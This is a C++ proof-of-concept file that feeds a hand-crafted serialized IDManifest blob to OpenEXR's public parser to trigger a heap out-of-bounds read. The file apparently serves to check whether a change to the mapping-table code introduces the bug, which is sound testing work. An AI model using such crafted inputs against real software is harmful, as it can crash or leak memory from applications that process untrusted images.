// PoC for a delocalized heap out-of-bounds read in OpenEXR's IDManifest parser.
//
// Entry point: the public, IMF_EXPORT constructor
//     Imf::IDManifest(const char* data, const char* end)
// declared in <ImfIDManifest.h>. This is the in-contract way an application
// decodes the serialized ("uncompressed") form of an idManifest attribute.
//
// The crafted blob below is a well-formed serialized IDManifest:
//   - version 0
//   - a string table of 4 strings
//   - a run-length mapping block that references only string index 0
//   - one channel-group manifest with one channel, one component and one
//     ID-table entry whose single component names string index 3.
//
// Because the mapping block only references index 0, the decoded mapping
// table holds a single element. The per-ID component reference (index 3)
// is validated against the *string list* size (4), not against the mapping
// it actually indexes, so `mapping[3]` reads past the end of the 1-element
// heap buffer.
//
// On the pre-change tree the mapping table is preallocated to the string
// count and value-initialized, so `mapping[3]` is in-bounds (reads 0) and
// the blob parses cleanly. On the modified tree the mapping table is built
// incrementally, so `mapping[3]` is a heap-buffer-overflow that AddressSanitizer
// aborts on.
//
// Build/run as C++ (public Imf C++ API).

#include <ImfIDManifest.h>

#include <cstddef>
#include <cstdio>
#include <exception>

int
main (void)
{
    // clang-format off
    static const unsigned char blob[] = {
        // version = 0
        0x00, 0x00, 0x00, 0x00,

        // --- string list ---
        0x04, 0x00, 0x00, 0x00,       // number of strings = 4
        0x01, 0x01, 0x01, 0x01,       // length of each string (varint) = 1
        'A',  0x00, 0x00, 0x00,       // string bytes: "A", then 3 prefix-coded
                                      //   strings with common-prefix length 0

        // --- run-length mapping block ---
        0x01, 0x00, 0x00, 0x00,       // rleLength = 1
        0x00, 0x00, 0x00, 0x00,       // first = 0
        0x00, 0x00, 0x00, 0x00,       // last  = 0   (maps only index 0)

        // --- number of channel-group manifests ---
        0x01, 0x00, 0x00, 0x00,       // manifestEntries = 1

        // channels string list: 1 string "R"
        0x01, 0x00, 0x00, 0x00,
        0x01,
        'R',

        // components string list: 1 string "c"
        0x01, 0x00, 0x00, 0x00,
        0x01,
        'c',

        0x00,                         // lifetime

        0x00, 0x00, 0x00, 0x00,       // hash scheme: pascal string, length 0
        0x00, 0x00, 0x00, 0x00,       // encoding scheme: pascal string, length 0

        0x01,                         // storage scheme = 1 (32-bit IDs)
        0x01, 0x00, 0x00, 0x00,       // ID table size = 1

        0x00, 0x00, 0x00, 0x00,       // ID[0] (32-bit) = 0
        0x03                          // component 0 -> string index 3
    };
    // clang-format on

    const char* data = reinterpret_cast<const char*> (blob);
    const char* end  = data + sizeof (blob);

    try
    {
        Imf::IDManifest manifest (data, end);
        std::printf (
            "parsed IDManifest with %zu channel group(s)\n",
            static_cast<size_t> (manifest.size ()));
    }
    catch (const std::exception& e)
    {
        std::printf ("IDManifest rejected: %s\n", e.what ());
    }

    return 0;
}
